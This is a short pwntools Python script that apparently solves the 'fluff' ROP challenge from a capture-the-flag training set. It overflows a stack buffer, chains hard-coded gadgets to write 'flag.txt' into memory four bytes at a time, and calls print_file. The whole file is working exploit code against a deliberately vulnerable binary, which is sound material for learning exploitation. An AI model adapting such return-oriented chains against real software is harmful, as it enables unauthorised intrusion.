from pwn import *

elf = context.binary = ELF("./fluff")
r = process()

WRITE32 = p64(0x0000000000400606) #mov dword ptr [rbp + 0x48], edx; mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret; -> writes 32 bits then restarts
POP_RDI = p64(0x00000000004006a3)
POP_RDX_RCX = p64(0x000000000040062a) #pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
RET = p64(0x0000000000400295)

PRINT_FILE = p64(0x00400620)

ADDRESS_PTR = 0x00601028 

def pop_rdx(value):
    return POP_RDX_RCX + p64(u32(value)) + p64(0x0)

def write_4bytes(address, content): #writes 4 bytes then restarts binary
    return p64(address) + pop_rdx(content) + RET + WRITE32

payload = b"A"*32 + write_4bytes(ADDRESS_PTR-0x48, b"flag")
r.sendline(payload)

payload = b"A"*32 + write_4bytes(ADDRESS_PTR-0x44, b".txt")
r.sendline(payload)

payload = b"A"*40 + POP_RDI + p64(ADDRESS_PTR) + PRINT_FILE
r.sendline(payload)

r.interactive()